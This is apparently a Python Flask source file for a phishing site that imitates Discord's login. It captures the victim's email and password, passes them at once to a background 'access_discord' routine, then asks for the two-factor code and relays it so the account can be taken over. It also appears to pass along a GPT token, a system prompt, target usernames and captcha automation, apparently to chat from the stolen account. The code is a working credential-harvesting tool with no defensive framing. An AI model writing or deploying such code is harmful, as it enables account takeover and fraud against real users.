import queue
from flask import Flask, render_template, request, redirect, url_for, current_app
from chat_on_discord import access_discord
from threading import Thread

app = Flask(__name__)

app.config['CODE_QUEUE'] = queue.Queue()

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        login = request.form.get('email')
        password = request.form.get('password')
        
        code_q = current_app.config['CODE_QUEUE']
        
        Thread(target=access_discord, args=(login, password, current_app.config['GPT_TOKEN'], current_app.config['SYSTEM_PROMPT'], current_app.config['USERNAMES'], current_app.config['AUTOMATE_CAPTCHA'], code_q), daemon=True).start()
        
        if '@' in login:
            return redirect('/twofa_email')
        else:
            return redirect('/twofa_phone')
        
    return render_template('Discord.htm')

@app.route('/twofa_email', methods=['GET', 'POST'])
def twofa_email():
    return render_template('twofa_email.htm')

@app.route('/twofa_phone', methods=['GET', 'POST'])
def twofa_phone():
    if request.method == 'POST':
        code = request.form.get('code')
        q = current_app.config['CODE_QUEUE']
        q.put(code)
        
        return redirect('/dashboard')
    
    return render_template('twofa_phone.htm')

@app.route('/dashboard')
def dashboard():
    return '<h1>Welcome!</h1>'

@app.route('/')
def index():
    return redirect('/login')

def run_app(gpt_token, system_prompt, usernames, automate_captcha):
    app.config['GPT_TOKEN'] = gpt_token
    app.config['SYSTEM_PROMPT'] = system_prompt
    app.config['USERNAMES'] = usernames
    app.config['AUTOMATE_CAPTCHA'] = automate_captcha
    app.run(host='0.0.0.0', port=5000, debug=True)